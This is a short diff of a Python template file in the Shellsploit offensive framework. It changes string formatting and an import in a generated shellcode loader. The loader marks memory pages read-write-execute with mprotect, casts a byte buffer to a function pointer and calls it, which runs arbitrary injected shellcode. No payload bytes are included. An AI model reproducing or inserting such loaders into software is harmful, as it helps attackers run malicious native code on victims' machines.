@@ -14,10 +14,10 @@ import multiprocessing
 
 #Project : https://github.com/b3mb4m/Shellsploit
 #This file created with shellsploit ..
-#%s - %s
+#{0} - {1}
 
 
-shellcode_data = (b"%s")
+shellcode_data = (b"{2}")
 
 shellcode = ctypes.c_char_p(shellcode_data)
 function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
@@ -29,9 +29,9 @@ addr_page = (addr // pagesize) * pagesize
 for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
     assert libc.mprotect(page_start, pagesize, 0x7) == 0
 function()   
-""" % (time.strftime("%d/%m/%Y"), time.strftime("%H:%M:%S"), shellcode)
+""".format(time.strftime("%d/%m/%Y"), time.strftime("%H:%M:%S"), shellcode)
 
-	from logger import logs
+	from .logger import logs
 	logs( db, "py")
 
 
